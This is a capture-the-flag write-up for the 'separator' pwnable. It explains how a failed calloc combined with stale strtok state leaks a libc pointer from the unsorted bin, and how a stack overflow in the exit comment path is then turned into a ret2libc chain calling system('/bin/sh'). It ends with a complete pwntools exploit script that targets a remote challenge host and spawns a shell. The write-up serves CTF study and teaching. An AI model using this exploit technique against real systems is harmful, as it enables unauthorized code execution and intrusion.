# pwn/separator

## Overview

This challenge is a small menu-driven pwnable that gives us three actions:

1. store a sentence on the heap
2. split a stored sentence with `strtok()`
3. exit after entering a final comment

The solution is built from two separate bugs that fit together very cleanly.

The first bug is in the heap logic. The program stores heap pointers in a global `sentences` array and tracks whether a slot is active with a second global array named `setted_sentence`. The interesting detail is that the program marks a slot as active even if `calloc()` fails and returns `NULL`. Later, the split function passes that `NULL` pointer into `strtok()`, which makes `strtok()` continue from its old internal saved pointer. That lets us turn stale `strtok()` state into a libc leak.

The second bug is in the exit path. When the program asks for a final comment, it reads `0x100` bytes into a stack buffer that is only `0x20` bytes long. Once we know libc, that overflow is enough to build a straightforward ret2libc chain and call `system("/bin/sh")`.

So the challenge is not a pure heap takeover. The heap bug gives us the one thing the stack overflow is missing: a reliable libc address. Once we have that, the overflow finishes the exploit.

Before exploiting anything, it is helpful to identify the functions and globals in the binary:

- `main` at `0x1502`
- `set_sentence` at `0x1275`
- `separate_sentence` at `0x138b`
- `sentences` at `0x4050`
- `setted_sentence` at `0x4068`

From the disassembly, the two menu handlers reduce to the following logic:

```c
void set_sentence() {
    int idx;
    size_t size;

    scanf("%d", &idx);
    scanf("%lu", &size);

    sentences[idx] = calloc(size, 1);
    read(0, sentences[idx], size);
    setted_sentence[idx] = 1;
}

void separate_sentence() {
    int idx;
    char sep[2] = {0};
    int token_idx = 0;

    scanf("%d", &idx);
    if (!setted_sentence[idx]) return;

    read(0, sep, 1);

    for (char *tok = strtok(sentences[idx], sep);
         tok != NULL;
         tok = strtok(NULL, sep)) {
        printf("Token %d: %s\n", token_idx++, tok);
    }

    free(sentences[idx]);
    sentences[idx] = NULL;
    setted_sentence[idx] = 0;
}
```

The exact instructions that matter are easy to spot:

- in `set_sentence`
  - `calloc()` at `0x131a`
  - store into `sentences[idx]` at `0x1333`
  - `read(0, sentences[idx], size)` at `0x136f`
  - set `setted_sentence[idx] = 1` at `0x1380`
- in `separate_sentence`
  - read one separator byte at `0x1444`
  - call `strtok()` at `0x147f`
  - print each token at `0x14a7`
  - `free(sentences[idx])` at `0x14ce`
- in `main`
  - the final comment overflow is `read(0, rbp-0x20, 0x100)` at `0x15f1`

With that picture in hand, the exploit becomes a very direct two-stage attack:

1. use `strtok()` and a failed heap allocation to leak a libc pointer from the unsorted bin
2. use the final comment overflow to return into `system("/bin/sh")`

## Exploit Chain

### 1. Prepare a libc leak

The final comment overflow is obvious once we look at `main`, but by itself it is not enough. The binary is PIE, ASLR is on, and NX is enabled. That means we need at least one runtime address before the overflow becomes useful.

The split logic gives us that address if we use `strtok()` carefully.

The important behavior of `strtok()` is this:

- the first call is `strtok(pointer, sep)`
- later calls can be `strtok(NULL, sep)`
- when the first argument is `NULL`, `strtok()` resumes from its internal saved position

So if we can make the program call `strtok(NULL, sep)` at a time when the saved position points into interesting memory, `printf("Token %d: %s\n", ...)` will print bytes from that stale location.

That is the primitive we are going to build.

### 2. Use a failed allocation to create a slot that is marked valid but contains a NULL pointer

The first half of the primitive comes from `set_sentence()`.

The function does three things in a row:

1. `sentences[idx] = calloc(size, 1)`
2. `read(0, sentences[idx], size)`
3. `setted_sentence[idx] = 1`

There is no check between those steps.

If `calloc()` fails, then `sentences[idx]` becomes `NULL`, but the code still tries the `read()` and still marks the slot as active. On Linux, `read(0, NULL, huge_size)` does not magically succeed, but it does fail immediately with `EFAULT` instead of crashing the process. The program ignores that failure and continues.

So after a failed allocation, we get a very useful state:

- `sentences[idx] == NULL`
- `setted_sentence[idx] == 1`

That means the split routine will accept the slot and then do:

```c
strtok(sentences[idx], sep)
```

which is really:

```c
strtok(NULL, sep)
```

This is exactly what we need, because `strtok(NULL, sep)` resumes from stale state.

To force the failure in a controlled way, we request:

```python
(1 << 64) - 1
```

That value is far beyond anything `calloc()` can satisfy, so the allocation reliably returns `NULL`.

### 3. Make `strtok()` save a pointer into a chunk that will later contain libc pointers

Now we need to decide what stale pointer `strtok()` should resume from.

We want it to resume from a freed heap chunk whose user area gets overwritten with allocator metadata. If that metadata contains libc pointers, printing it as a string will leak libc.

The unsorted bin gives us exactly that.

When a chunk is too large for tcache and gets freed, glibc links it into the unsorted bin. The freed chunk's user area begins with the bin linkage pointers, `fd` and `bk`, and those pointers point into the allocator's `main_arena` inside libc. In other words, a freed unsorted-bin chunk naturally stores libc addresses for us.

To force that situation, we do this:

```python
set_sent(0, 0x500, b"\x00" + b"a" * (0x500 - 1))
set_sent(1, 0x18, b"b" * 0x18)
sep_sent(0, b"Z")
```

First, `0x500` is chosen because it becomes a `0x510` heap chunk after the allocator adds metadata. A freed `0x510` chunk is too large for tcache, so it will go to the unsorted bin. That is what makes the freed chunk hold a libc pointer.

Second, the very first byte of the buffer is `\x00`. This makes the sentence look like an empty C string. When `separate_sentence(0, b"Z")` calls `strtok(sentences[0], "Z")`, `strtok()` immediately sees an empty string and returns `NULL` without printing any tokens. But that does not make the call useless. `strtok()` still updates its internal saved position to this buffer, which is exactly what we want.

Third, we allocate a small chunk in slot 1 right after slot 0. This is the guard chunk. Without it, the large chunk in slot 0 would likely sit next to the top chunk, and freeing it would merge it into the top chunk instead of placing it into the unsorted bin. The slot 1 allocation prevents that merge and keeps the large chunk as a normal freed chunk with unsorted-bin metadata.

After `sep_sent(0, b"Z")` finishes, the program frees slot 0. At that point:

- slot 0 is gone from the application's point of view
- the freed `0x510` chunk is sitting in the unsorted bin
- its user area now contains allocator pointers into libc
- `strtok()` still remembers a pointer into that chunk

That is the leak setup completed.

### 4. Resume `strtok()` from that stale pointer

Now we combine the two halves of the primitive.

We create a failed-allocation slot and then split it:

```python
set_sent(2, (1 << 64) - 1)
sep_sent(2, b"Z")
```

The first line makes slot 2 look valid to the program even though its pointer is `NULL`. The second line reaches `separate_sentence(2)`, passes the `setted_sentence[2]` check, and calls:

```c
strtok(NULL, "Z")
```

because `sentences[2]` is `NULL`.

At this moment, `strtok()` resumes from the saved pointer left behind when we split slot 0. But slot 0 has already been freed into the unsorted bin, so the bytes at that location are no longer our original sentence. They are allocator metadata. The first eight bytes are an unsorted-bin pointer into libc.

The program then prints:

```c
printf("Token 0: %s\n", tok);
```

As long as the chosen separator byte does not appear inside the leaked bytes before the first null terminator, `printf` will print the pointer bytes for us. Using `b"Z"` works fine here.

So by the time the line `Token 0: ...` is printed, we have turned a stale `strtok()` cursor into a libc leak.

### 5. Convert the leak into a libc base

The leaked pointer is not the base of libc. It is a pointer into the allocator's `main_arena` region.

Using the provided libc locally, we can measure the exact offset very easily:

1. run the binary with the shipped `libc.so.6`
2. trigger the leak once
3. read the real libc base from `/proc/<pid>/maps`
4. subtract the base from the leaked pointer

That difference is stable:

```python
0x203b20
```

So the base calculation is simply:

```python
libc.address = leak - 0x203b20
```

This is the moment where the exploit transitions from heap work to code execution. Once we know libc base, every important address becomes available:

- `system`
- a `pop rdi ; ret` gadget
- a plain `ret` gadget for stack alignment
- the `"/bin/sh"` string inside libc

Now the exit overflow can be used cleanly.

### 6. Use the final comment overflow as a standard ret2libc

The final menu option asks for a comment and then reads `0x100` bytes into a `0x20`-byte stack buffer.

Because the function uses a normal stack frame, the offset to the saved return address is straightforward:

- `0x20` bytes to fill the buffer
- `0x8` bytes to overwrite saved `rbp`
- saved `rip` starts at offset `0x28`

So the final payload is:

```python
payload  = b"A" * 0x28
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)
```

The extra `ret` before `system` is used to keep the stack aligned on systems that care about `movaps` alignment.

After sending this payload, the program returns into libc, runs `system("/bin/sh")`, and gives us a shell. 

## Final Solve

```python
#!/usr/bin/env python3
from pwn import *
import os


context.arch = "amd64"
context.log_level = os.environ.get("LOG", "info")

HOST = os.environ.get("HOST", "16.184.2.86")
PORT = int(os.environ.get("PORT", "1338"))
CMD = os.environ.get("CMD")

# The freed 0x510 chunk lands in the unsorted bin, so the stale strtok() walk
# prints a main_arena pointer from the chunk metadata.
MAIN_ARENA_LEAK = 0x203B20
SYSTEM = 0x58740
BIN_SH = 0x1CB42F
POP_RDI = 0x10F75B
RET = 0x2882F


def start():
    return remote(HOST, PORT)


def set_sent(io, idx, size, data=b""):
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"Enter sentence index (0-2): ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Enter sentence size: ")
    io.sendline(str(size).encode())
    io.recvuntil(b"Enter sentence: ")
    if data:
        io.send(data)


def sep_sent(io, idx, sep):
    io.recvuntil(b"> ")
    io.sendline(b"2")
    io.recvuntil(b"Enter sentence index (0-2): ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Enter separator: ")
    io.send(sep)


def build_rop(libc_base):
    return flat(
        b"A" * 0x28,
        libc_base + POP_RDI,
        libc_base + BIN_SH,
        libc_base + RET,
        libc_base + SYSTEM,
    )


def main():
    io = start()

    set_sent(io, 0, 0x500, b"\x00" + b"a" * (0x500 - 1))
    set_sent(io, 1, 0x18, b"b" * 0x18)
    sep_sent(io, 0, b"Z")

    set_sent(io, 2, (1 << 64) - 1)
    sep_sent(io, 2, b"Z")

    io.recvuntil(b"Token 0: ")
    leak = u64(io.recvline().rstrip(b"\n").ljust(8, b"\x00"))
    libc_base = leak - MAIN_ARENA_LEAK
    log.info("libc leak = %#x", leak)
    log.info("libc base = %#x", libc_base)

    io.sendline(b"3")
    io.recvuntil(b"Any comments? ")
    io.sendline(build_rop(libc_base))

    if CMD:
        io.sendline(CMD.encode())
        print(io.recvrepeat(2.0).decode("latin-1", "ignore"), end="")
        io.close()
        return

    io.interactive()


if __name__ == "__main__":
    main()
```

Run it from the challenge directory with:

```bash
python3 ./solve.py
```

Note: this will launch a shell after exploit. Show the flag with `cat ./flag`.
